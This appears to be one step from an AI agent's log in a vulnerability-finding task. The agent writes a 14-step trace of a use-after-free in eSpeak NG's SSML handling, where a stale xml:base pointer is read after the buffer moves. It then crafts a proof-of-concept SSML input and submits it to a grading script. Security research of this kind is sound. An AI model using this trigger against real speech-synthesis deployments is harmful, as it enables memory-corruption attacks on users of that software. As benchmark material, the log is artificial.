message:
Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/candidate_trace.json')
trace=[
  {"step":1,"file":"src/libespeak-ng/speech.c","function":"sync_espeak_Synth","line":537,"var":"text","code":"status = Synthesize(unique_identifier, text, flags);","note":"The attacker-controlled SSML byte string is passed into the synchronous synthesis path."},
  {"step":2,"file":"src/libespeak-ng/speech.c","function":"Synthesize","line":446,"var":"text","code":"status = text_decoder_decode_string_multibyte(p_decoder, text, translator->encoding, flags);","note":"The input bytes are decoded into the internal text stream that the clause reader consumes."},
  {"step":3,"file":"src/libespeak-ng/readclause.c","function":"ReadClause","line":602,"var":"terminator","code":"terminator = ProcessSsmlTag(xml_buf, buf, &ix, n_buf, xmlbase, &audio_text, voice_change, &base_voice, base_voice_variant_name, &ignore_text, &clear_skipping_text, &sayas_mode, &sayas_start, ssml_stack, &n_ssml_stack, &n_param_stack, (int *)speech_parameters);","note":"SSML tags are parsed and dispatched to ProcessSsmlTag, which can mutate parser state and append embedded commands."},
  {"step":4,"file":"src/libespeak-ng/ssml.c","function":"ProcessSsmlTag","line":811,"var":"SSML_AUDIO","code":"case SSML_AUDIO:","note":"An <audio> tag is recognized and enters the audio-handling branch."},
  {"step":5,"file":"src/libespeak-ng/ssml.c","function":"ProcessSsmlTag","line":831,"var":"uri","code":"uri = &namedata[index];","note":"The audio src attribute is copied into the shared namedata buffer and referenced through uri for callback-based handling."},
  {"step":6,"file":"src/libespeak-ng/ssml.c","function":"ProcessSsmlTag","line":833,"var":"uri_callback","code":"if (uri_callback(1, uri, xmlbase) == 0) {","note":"The URI callback is invoked on the namedata-backed string; if it accepts the URI, the tag is treated as playable audio and the parser state is updated."},
  {"step":7,"file":"src/libespeak-ng/ssml.c","function":"ProcessSsmlTag","line":845,"var":"audio_text","code":"*audio_text = true;","note":"The parser marks that it is inside audio text, which changes later punctuation and clause handling."},
  {"step":8,"file":"src/libespeak-ng/readclause.c","function":"ReadClause","line":818,"var":"audio_text","code":"if (option_punctuation && iswpunct(c1) && (audio_text == false)) {","note":"While audio_text is true, punctuation is no longer announced, so the clause reader continues consuming the attacker-controlled stream in a different state."},
  {"step":9,"file":"src/libespeak-ng/ssml.c","function":"ProcessSsmlTag","line":849,"var":"SSML_AUDIO + SSML_CLOSE","code":"case SSML_AUDIO + SSML_CLOSE:","note":"The closing </audio> tag is recognized and the audio-specific state is torn down."},
  {"step":10,"file":"src/libespeak-ng/ssml.c","function":"ProcessSsmlTag","line":851,"var":"audio_text","code":"*audio_text = false;","note":"Leaving the audio element resets audio_text, restoring normal text interpretation for subsequent bytes."},
  {"step":11,"file":"src/libespeak-ng/readclause.c","function":"InitNamedata","line":968,"var":"namedata","code":"if (namedata != NULL) { free(namedata); namedata = NULL; n_namedata = 0; }","note":"At synthesis reset, the shared namedata buffer is freed and invalidated, so any stale pointer into it becomes dangling."},
  {"step":12,"file":"src/libespeak-ng/readclause.c","function":"AddNameData","line":419,"var":"namedata","code":"if ((vp = realloc(namedata, namedata_ix+len + 1000)) == NULL)","note":"Subsequent attacker-controlled SSML attributes can force namedata to grow and move, invalidating previously returned pointers."},
  {"step":13,"file":"src/libespeak-ng/ssml.c","function":"ProcessSsmlTag","line":894,"var":"xmlbase","code":"if ((index = AddNameData(buf, 0)) >= 0) xmlbase = &namedata[index];","note":"The <speak xml:base=...> attribute stores a pointer into namedata for later use by <audio> path resolution."},
  {"step":14,"file":"src/libespeak-ng/ssml.c","function":"ProcessSsmlTag","line":819,"var":"xmlbase","code":"if ((xmlbase != NULL) && (buf[0] != '/')) { sprintf(fname, \"%s/%s\", xmlbase, buf); }","note":"Later <audio> tags dereference the saved xmlbase pointer; if namedata moved or was freed, this becomes a use-after-free read sink."}
]
p.write_text(__import__('json').dumps(trace, indent=2))
print(p.read_text())
PY
cat > /tmp/poc4.ssml <<'EOF'
<speak xml:base=""><audio src="B"/></speak>
EOF
bash /workspace/submit.sh /tmp/poc4.ssml /workspace/candidate_trace.json > /tmp/submit4.log 2>&1; ec=$?; echo EXIT:$ec; tail -80 /tmp/submit4.log
